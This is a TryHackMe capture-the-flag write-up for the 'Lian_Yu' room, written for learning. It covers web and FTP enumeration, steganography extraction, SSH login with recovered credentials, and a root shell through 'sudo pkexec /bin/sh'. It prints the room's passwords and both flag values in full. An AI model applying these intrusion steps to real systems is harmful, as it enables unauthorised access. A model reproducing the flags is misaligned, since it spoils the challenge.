# 🏹 Lian_Yu

### TryHackMe Writeup

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)
![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)

---

## 📋 Overview

| Field | Details |
| --- | --- |
| **Target** | `lian` |
| **OS** | Debian Linux |
| **Attack Surface** | Web enumeration, FTP credential reuse, steganography, PNG header corruption |
| **Privesc** | `sudo pkexec /bin/sh` |

Lian_Yu is an Arrow-themed CTF that chains web enumeration rabbit holes into FTP access, then pivots through a steganography extraction sequence involving a broken PNG header and a `steghide`-hidden zip, ultimately landing SSH credentials for a user with trivial `sudo pkexec` root access. The attack surface is entirely fictional — no technique here maps to anything you'd encounter in a real engagement. It's a fan-fiction scavenger hunt dressed up as a CTF, and it required a walkthrough specifically because multiple steps depend on knowledge that no reasonable enumeration methodology would surface. Zero MITRE ATT&CK coverage. Proceed with calibrated contempt.

---

## 🔍 Enumeration

### Port Scan

```bash
nmap -sC -sV -p- -vv -T4 lian -oA lian-tcp
```

```
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8
80/tcp    open  http    Apache httpd
111/tcp   open  rpcbind 2-4 (RPC #100000)
```

FTP is running vsftpd 3.0.2 — no applicable exploit for this version. RPC was a dead end:

```bash
showmount -e lian
# clnt_create: RPC: Program not registered
```

### FTP — No Anonymous Login

```
ftp> open lian
Name: anonymous
530 Permission denied.

Name: guest
530 Permission denied.
```

Nothing. Shelve FTP and pivot to HTTP.

### Web — Directory Bruteforce

```bash
ffuf -u http://lian/FUZZ -w ./raft-medium-directories.txt -ic -fc 403
```

```
island    [Status: 301]
```

```bash
curl http://lian/island/
```

```html
<h2 style="color:white"> vigilante</style></h2>
```

The codeword `vigilante` is hidden in white text. Classic CTF "look at the source" moment. Continuing enumeration under `/island/`:

```bash
ffuf -u http://lian/island/FUZZ \
  -w ./SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -ic -fc 403
```

```
2100    [Status: 301]
```

```bash
curl http://lian/island/2100/
# <!-- you can avail your .ticket here but how? -->
```

The HTML comment drops a file extension hint. Fuzzing for `.ticket` files:

```bash
ffuf -u http://lian/island/2100/FUZZ.ticket \
  -w ./SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -ic -fc 403
```

```
green_arrow    [Status: 200]
```

```bash
curl http://lian/island/2100/green_arrow.ticket
# RTy8yhBQdscX
```

Base58-decode that string:

```
RTy8yhBQdscX → !#th3h00d
```

So: `vigilante` was the username hiding in white HTML text, `!#th3h00d` is the password extracted from a `.ticket` file found by guessing the extension from an HTML comment. This is the entire "recon" phase. Charming.

---

## 💀 Initial Access — FTP Credential Reuse + Steganography Chain

### FTP Login

```
ftp> open lian
Name: vigilante
Password: !#th3h00d
230 Login successful.
```

```
ftp> ls
-rw-r--r--  Leave_me_alone.png  (511720 bytes)
-rw-r--r--  Queen's_Gambit.png  (549924 bytes)
-rw-r--r--  aa.jpg              (191026 bytes)
```

```
ftp> mget *.png
ftp> mget *.jpg
```

Navigating up revealed two home directories: `slade` and `vigilante`. Noted for later.

### PNG Header Corruption

`Leave_me_alone.png` fails to open — the file is intact but the magic bytes are corrupted. The correct PNG header is `89 50 4E 47 0D 0A 1A 0A`. Fix it in a hex editor (e.g. `hexedit`, `010 Editor`, `xxd` + patch), reopen the image, and it displays the word **password**.

That's the `steghide` passphrase.

```bash
file Leave_me_alone.png
# PNG image data, 845 x 475, 8-bit/color RGBA, non-interlaced
# (after fix)
```

### Steghide Extraction

```bash
steghide extract -sf aa.jpg
# Enter passphrase: password
# wrote extracted data to "ss.zip"

unzip ss.zip
# inflating: passwd.txt
# inflating: shado
```

```bash
cat passwd.txt
# [flavour text, no useful creds]

cat shado
# M3tahuman
```

---

## 🔐 SSH — Lateral Pivot

Two usernames from FTP home directory listing: `slade` and `vigilante`. `shado` is a character from Arrow, which the room's author clearly loved more than realistic scenario design. Try `slade:M3tahuman`:

```bash
ssh slade@lian
# password: M3tahuman
```

```
slade@LianYu:~$ cat user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```

---

## ⬆️ Privilege Escalation — sudo pkexec

```bash
sudo -l
# (root) PASSWD: /usr/bin/pkexec
```

`pkexec` with `sudo` and a known password. That's it. That's the whole privesc.

```bash
sudo pkexec /bin/sh
```

```
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```

---

## 🗺️ Attack Chain

```
[Nmap]
    FTP (vsftpd 3.0.2) — anon denied
    HTTP (Apache) — "Purgatory" landing page
         │
         ▼
[Web Enumeration — ffuf]
    /island/ → white-text codeword "vigilante"
    /island/2100/ → HTML comment hints at .ticket extension
    /island/2100/green_arrow.ticket → base58 string → "!#th3h00d"
         │
         ▼
[FTP — vigilante:!#th3h00d]
    Leave_me_alone.png (corrupt header) → fix magic bytes → reveals "password"
    aa.jpg → steghide extract (passphrase: password) → ss.zip
    ss.zip → shado → M3tahuman
         │
         ▼
[SSH — slade:M3tahuman]
    user.txt
         │
         ▼
[sudo pkexec /bin/sh]
    root
    root.txt
```

---

## 📌 Key Takeaways

This room is about as far from a real engagement as it gets. Here's what you'd actually take away if you squint hard enough:

* **`steghide` and PNG header tampering are CTF staples with essentially zero field relevance.** If you're doing steganography forensics in a real engagement, something has gone very wrong or very right, and it's almost certainly not hidden in a JPEG on an FTP server.

* **The `.ticket` extension and base58 encoding are pure puzzle mechanics.** No threat actor is encoding credentials in base58 in a file named after an Arrow character. You needed a walkthrough here not because you're bad at pentesting, but because the puzzle-to-signal ratio is garbage. The HTML comment giving you the extension hint is the only legitimate breadcrumb — everything else is guess-the-author's-brain.

* **`sudo pkexec` as privesc is worth knowing contextually** — `pkexec` is the polkit binary that was genuinely affected by CVE-2021-4034 (PwnKit), which allowed local privilege escalation *without knowing the password*. Here it's just `sudo` with a password, which isn't really a lesson, it's a speedbump.

* **Directory brute-forcing is a CTF mechanic, not a methodology.** In a real engagement you'd spider the application — Burp's crawler follows actual links, forms, and JS-rendered paths the way a real user would, surfacing real attack surface without hammering the server. In bug bounty specifically, aggressive fuzzing against a WAF-protected target gets your IP blocked before you find anything. Passive recon (JS file analysis, Wayback Machine, Google dorking) is how people actually work. The room hides paths that have zero inbound links by design — that's a puzzle constraint, not a lesson in enumeration.

* **Zero MITRE ATT&CK coverage of consequence.** Web enumeration (T1595), credential reuse (T1078), and that's generously interpreted. This room teaches you to think like a CTF player, not like an attacker.

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Valid Accounts: Default Accounts | [T1078.001](https://attack.mitre.org/techniques/T1078/001) |
| Defense Evasion | Obfuscated Files or Information: Steganography | [T1027.003](https://attack.mitre.org/techniques/T1027/003) |
| Collection | Data from Local System | [T1005](https://attack.mitre.org/techniques/T1005) |
| Privilege Escalation | Abuse Elevation Control Mechanism: Sudo and Sudo Caching | [T1548.003](https://attack.mitre.org/techniques/T1548/003) |

---

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service enumeration |
| `ffuf` | Directory and file extension bruteforce |
| `ftp` | Login as vigilante, retrieve image files |
| hex editor | Fix corrupted PNG magic bytes |
| `steghide` | Extract zip archive from JPEG |
| `ssh` | Login as slade with extracted credentials |

## 🚩 Flags

| Flag | Value |
| --- | --- |
| `user.txt` | `THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}` |
| `root.txt` | `THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}` |
